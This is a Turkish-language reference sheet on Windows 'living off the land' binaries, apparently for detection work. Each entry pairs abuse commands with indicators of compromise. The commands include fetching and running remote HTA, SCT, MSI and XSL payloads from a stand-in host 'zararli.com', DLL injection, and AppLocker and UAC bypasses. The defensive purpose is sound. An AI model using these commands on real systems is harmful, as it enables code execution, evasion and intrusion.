
### mshta.exe

HTML Application (.hta) dosyalarını çalıştırır. Uzak HTA veya inline VBScript/JScript çalıştırma

**Komut:**
- mshta.exe [http://zararli.com/payload.hta](http://zararli.com/payload.hta)

- mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd.exe""")

**IOC:** mshta.exe + URL argümanı, child olarak cmd/powershell, meşru kullanım neredeyse yok

-----

### rundll32.exe

DLL içindeki fonksiyonları çalıştırır. Zararlı DLL çalıştırma, JavaScript inline, AppLocker bypass

**Komut:**
- rundll32.exe javascript:"..\\mshtml,RunHTMLApplication";...

- rundll32.exe zararlı.dll,EntryPoint

- rundll32.exe shell32.dll,ShellExec\_RunDLL cmd.exe

**IOC:** javascript: veya vbscript: argümanı, URL üzerinden DLL yükleme

-----

### regsvr32.exe (Squiblydoo)

COM DLL'lerini register/unregister eder. Uzak SCT dosyasından kod çalıştırma, AppLocker bypass

**Komut:**
- regsvr32.exe /s /n /u /i:[http://zararli.com/payload.sct](http://zararli.com/payload.sct) scrobj.dll

**IOC:** /i:http + scrobj.dll kombinasyonu kesin IOC

-----

### msiexec.exe

.msi paket kurulumu yapar. Uzak MSI indirip çalıştırma, DLL register

**Komut:**
- msiexec /q /i [http://zararli.com/payload.msi](http://zararli.com/payload.msi)

- msiexec /y zararlı.dll

**IOC:** /i http:// veya UNC path argümanı

-----

### wmic.exe

WMI üzerinden sistem yönetimi. Uzak/yerel komut çalıştırma, XSL üzerinden kod

**Komut:**
- wmic process call create "cmd.exe /c whoami"

- wmic /node:TARGET process call create "payload.exe"

- wmic os get /FORMAT:"[http://zararli.com/payload.xsl](http://zararli.com/payload.xsl)"

**IOC:** process call create + şüpheli komut, /FORMAT:http://

-----

### msbuild.exe

.NET proje derler. .csproj/.xml içindeki C\# kodu çalıştırır, AppLocker bypass

**Komut:**
- msbuild.exe C:\\temp\\payload.csproj

**IOC:** Geliştirici ortamı dışında, Temp'te proje dosyası

-----

### installutil.exe

.NET assembly kurulum/kaldırma .NET assembly içindeki kodu çalıştırır, AppLocker bypass

**Komut:**
- installutil.exe /logfile= /LogToConsole=false /U zararlı.exe

**IOC:** /logfile= /U parametreleri birlikte

-----

### csc.exe

C\# kaynak kodu derler. Zararlı C\# kodunu yerinde derleyip çalıştırır

**Komut:**
- csc.exe /out:payload.exe payload.cs

**IOC:** Temp dizininde .cs → .exe derleme

-----

### cmstp.exe

VPN bağlantı profili kurar. INF dosyasından kod çalıştırma, UAC bypass

**Komut:**
- cmstp.exe /s payload.inf

- cmstp.exe /ns /s payload.inf

**IOC:** .inf argümanı, UAC bypass varyantı

-----

### wscript.exe / cscript.exe

VBScript ve JScript çalıştırır. Zararlı script çalıştırma, uzantı bypass. Lazarus grubu tarafından yeniden adlandırılarak (WMPlaybackSrv.exe) kullanıldığı belgelenmiş.

**Komut:**

- wscript.exe payload.vbs

- wscript.exe //e:jscript payload.txt

**IOC:** //e: flag ile uzantı maskeleme, Temp/AppData'dan script, yeniden adlandırılmış binary

-----

### forfiles.exe

Toplu dosya işlemleri. /c parametresiyle komut çalıştırma

**Komut:**

- forfiles /p C:\\windows\\system32 /m notepad.exe /c "cmd /c payload.exe"

**IOC:** /c parametresinde cmd veya powershell

-----

### mavinject.exe

App-V için DLL injection. Çalışan process'e DLL inject eder

**Komut:**

- mavinject.exe \<PID\> /INJECTRUNNING zararlı.dll

**IOC:** Meşru Microsoft aracı olmasına rağmen injection yapıyor

-----

### mmc.exe

Microsoft Management Console. COM server olarak çalıştırılır (Impacket dcomexec)

**Komut:**
- mmc.exe -Embedding

**IOC:** -Embedding argümanı + beklenmedik child process
Tipik dcomexec zinciri: svchost → mmc.exe -Embedding → cmd.exe

-----

### wuauclt.exe ⚠️ Yükselen

Windows Update istemcisi. Zararlı DLL yükleme ve çalıştırma. Lazarus grubu tarafından aktif kampanyalarda kullanıldığı belgelenmiş.

**Komut:**
- wuauclt.exe /UpdateDeploymentProvider C:\temp\zararlı.dll /RunHandlerComServer

**IOC:** /UpdateDeploymentProvider + beklenmedik DLL path, /RunHandlerComServer parametresi